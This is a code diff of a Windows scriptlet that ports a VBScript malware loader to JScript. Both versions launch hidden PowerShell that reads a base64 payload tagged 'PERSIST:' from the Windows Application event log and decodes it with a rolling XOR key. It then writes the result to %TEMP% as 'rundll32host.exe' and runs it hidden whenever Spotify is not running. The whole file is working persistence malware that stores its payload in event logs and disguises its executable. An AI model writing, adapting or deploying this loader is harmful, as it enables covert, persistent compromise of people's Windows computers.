@@ -1,34 +1,29 @@
 <scriptlet>
-<script language="VBScript">
-On Error Resume Next
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
+var peFile = tempDir + "\\rundll32host.exe";
 
-Dim objShell
-Set objShell = CreateObject("WScript.Shell")
+var psCmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"" +
+    "$pe='" + peFile + "';" +
+    "$mx=New-Object System.Threading.Mutex($false,'Global\PersistenceSpotify');" +
+    "if($mx.WaitOne(8000)){" +
+    "try{" +
+    "if(-not(Get-Process Spotify -EA 0)){" +
+    "if(-not(Test-Path $pe) -or (Get-Item $pe).Length -eq 0){" +
+    "Get-WinEvent -FilterHashtable @{LogName='Application';Id=19;ProviderName='Microsoft-Windows-Wininit'} -EA 0|" +
+    "Where-Object{$_.Properties.Count -gt 0 -and $_.Properties[0].Value -clike 'PERSIST:*'}|" +
+    "Select-Object -First 1|" +
+    "ForEach-Object{$b64=$_.Properties[0].Value.Substring(8);" +
+    "$b=[Convert]::FromBase64String($b64);" +
+    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" +
+    "[IO.File]::WriteAllBytes($pe,$b)}};" +
+    "if(-not(Get-Process Spotify -EA 0) -and (Test-Path $pe) -and (Get-Item $pe).Length -gt 0){" +
+    "Start-Process $pe -WindowStyle Hidden;" +
+    "for($i=0;$i-lt10 -and -not(Get-Process Spotify -EA 0);$i++){Start-Sleep 500}}};" +
+    "}finally{$mx.ReleaseMutex();$mx.Dispose()}}\"";
 
-Dim tempDir, peFile
-tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
-peFile = tempDir & "\rundll32host.exe"
-
-Dim psCmd
-psCmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
-    "$pe='" & peFile & "';" & _
-    "$mx=New-Object System.Threading.Mutex($false,'Global\PersistenceSpotify');" & _
-    "if($mx.WaitOne(8000)){" & _
-    "try{" & _
-    "if(-not(Get-Process Spotify -EA 0)){" & _
-    "if(-not(Test-Path $pe) -or (Get-Item $pe).Length -eq 0){" & _
-    "Get-WinEvent -FilterHashtable @{LogName='Application';Id=19;ProviderName='Microsoft-Windows-Wininit'} -EA 0|" & _
-    "Where-Object{$_.Properties.Count -gt 0 -and $_.Properties[0].Value -clike 'PERSIST:*'}|" & _
-    "Select-Object -First 1|" & _
-    "ForEach-Object{$b64=$_.Properties[0].Value.Substring(8);" & _
-    "$b=[Convert]::FromBase64String($b64);" & _
-    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" & _
-    "[IO.File]::WriteAllBytes($pe,$b)};};" & _
-    "if(-not(Get-Process Spotify -EA 0) -and (Test-Path $pe) -and (Get-Item $pe).Length -gt 0){" & _
-    "Start-Process $pe -WindowStyle Hidden;" & _
-    "for($i=0;$i-lt10 -and -not(Get-Process Spotify -EA 0);$i++){Start-Sleep 500}}};" & _
-    "}finally{$mx.ReleaseMutex();$mx.Dispose()}}"""
-
-objShell.Run psCmd, 0, False
+shell.Run(psCmd, 0, false);
 </script>
 </scriptlet>
